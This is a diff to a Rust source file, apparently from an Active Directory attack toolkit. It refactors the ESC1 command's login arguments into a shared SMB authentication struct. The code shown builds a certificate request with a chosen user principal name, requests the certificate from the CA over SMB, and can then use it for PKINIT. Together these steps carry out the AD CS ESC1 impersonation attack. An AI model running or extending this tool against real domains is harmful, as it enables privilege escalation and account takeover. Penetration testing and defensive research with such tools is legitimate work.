@@ -7,15 +7,8 @@ use clap::Parser;
 
 #[derive(Parser)]
 pub(crate) struct Esc1Args {
-    /// Target host or IP (the CA / DC)
-    #[arg(long)]
-    pub host: String,
-    #[arg(long)]
-    pub domain: String,
-    #[arg(long)]
-    pub user: String,
-    #[arg(long)]
-    pub password: String,
+    #[command(flatten)]
+    pub auth: crate::shared_args::SmbAuth,
     /// CA name, e.g. corp-CA
     #[arg(long)]
     pub ca: String,
@@ -46,19 +39,21 @@ pub(crate) async fn esc1(a: Esc1Args) -> Result<()> {
     let csr = adhammer_kerberos::csr::build_csr(subject, Some(&a.upn))?;
     eprintln!("[*] CSR built (subject CN={subject}, SAN upn={})", a.upn);
 
-    let mut smb = SmbClient::connect(&a.host).await?;
-    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
-    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
+    let mut smb = SmbClient::connect(&a.auth.host).await?;
+    smb.login(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password)
+        .await?;
+    smb.tree_connect(&format!("\\\\{}\\IPC$", a.auth.host))
+        .await?;
 
     let r = dcerpc::icpr::request_cert(
         &mut smb,
         &a.ca,
         &a.template,
         &csr.der,
-        &a.domain,
-        &a.user,
-        &a.password,
-        &a.host,
+        &a.auth.domain,
+        &a.auth.user,
+        &a.auth.password,
+        &a.auth.host,
     )
     .await?;
 
@@ -76,8 +71,13 @@ pub(crate) async fn esc1(a: Esc1Args) -> Result<()> {
         );
 
         if a.pkinit {
-            let kdc = a.kdc.clone().unwrap_or_else(|| a.host.clone());
-            let realm = a.upn.split('@').nth(1).unwrap_or(&a.domain).to_string();
+            let kdc = a.kdc.clone().unwrap_or_else(|| a.auth.host.clone());
+            let realm = a
+                .upn
+                .split('@')
+                .nth(1)
+                .unwrap_or(&a.auth.domain)
+                .to_string();
             match adhammer_kerberos::pkinit::pkinit_with_cert(
                 subject,
                 &realm,
